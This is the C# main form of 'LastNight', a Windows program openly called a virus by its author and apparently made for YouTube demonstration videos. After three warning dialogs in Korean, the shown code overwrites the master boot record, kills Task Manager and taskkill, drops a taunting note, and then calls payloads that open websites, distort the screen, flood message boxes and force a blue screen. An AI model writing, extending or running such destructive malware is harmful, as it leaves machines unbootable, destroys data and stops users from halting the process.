/*
 LAST NIGHT by R2turnTrue

Thanks for

Viewingpung(Aka. 뷰잉풍, INGPUNGYA): Upload this virus destruction to YouTube.
And you!!

You can contribute to this project on GitHub.

 */

using LastNight.Payloads;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace LastNight
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }

        private void Form1_Shown(object sender, EventArgs e)
        {
            Hide();
            if(MessageBox.Show("이 파일은 바이러스입니다. 당신의 컴퓨터가 망가집니다. 또한 재부팅 시 부팅이 되지 않을 수 있습니다. 실행하시겠습니까?"
                                , "LastNight", MessageBoxButtons.YesNo, MessageBoxIcon.Warning) == DialogResult.Yes &&
                MessageBox.Show("마지막 경고입니다. 정말로 실행하시겠습니까?", "LastNight - LAST WARNING!!", MessageBoxButtons.YesNo, MessageBoxIcon.Warning) == DialogResult.Yes &&
                MessageBox.Show("진짜 마지막 경고입니다. 이 파일은 바이러스이고, 당신의 컴퓨터를 망가뜨립니다.\n" +
                                "개발자에게 고소장을 날려도 책임지지 않습니다. 예를 누를경우 이 내용을 읽었다고 간주하겠습니다.\n" +
                                "제발 궁금하다고 실제 컴퓨터에서 실행하시지 말아주세요.", "LastNight - LAST WARNING!!!!!!!", MessageBoxButtons.YesNo, MessageBoxIcon.Warning) == DialogResult.Yes)
            {
                /*
                Process.Start("notepad.exe");

                string message = "Your computer is broken. In a minute, something terrible happens. Enjoy your last computer time now, a minute ago~-From creator of this virus";
                for(int i = 0; i < message.Length; i++)
                {
                    SendKeys.Send(message[i].ToString());
                }
                */

                File.WriteAllText(Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments) + "\\note.txt", "당신의 컴퓨터는 망가졌습니다. 1분 뒤에 무시무시한 일이 벌어집니다. 1분 전인 지금에 마지막 컴퓨터 시간을 즐기세요 :)");
                Process.Start(Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments) + "\\note.txt");
                new OverwriteMBR().RunPayload();
                Console.Beep();
                Thread th = new Thread(new ThreadStart(() =>
                {
                    if(Process.GetProcessesByName("taskmgr").Length != 0)
                    {
                        Process.GetProcessesByName("taskmgr")[0].Kill();
                    }
                    if(Process.GetProcessesByName("taskkill").Length != 0)
                    {
                        Process.GetProcessesByName("taskkill")[0].Kill();
                    }
                }));
                th.Start();
                Thread.Sleep(60000);
                new BeepSound().RunPayload();
                new BeepSound().RunPayload();
                new BeepSound().RunPayload();
                new BeepSound().RunPayload();
                new BeepSound().RunPayload();
                
                new OpenWebsites().RunPayload();

                new SwapDesktopColor().RunPayload();
                new Stretch().RunPayload();

                new MassMessageBox().RunPayload();

                new DrawIcons().RunPayload();

                new CauseBSOD().RunPayload();
            } else
            {
                Application.Exit();
            }
            
        }
    }
}
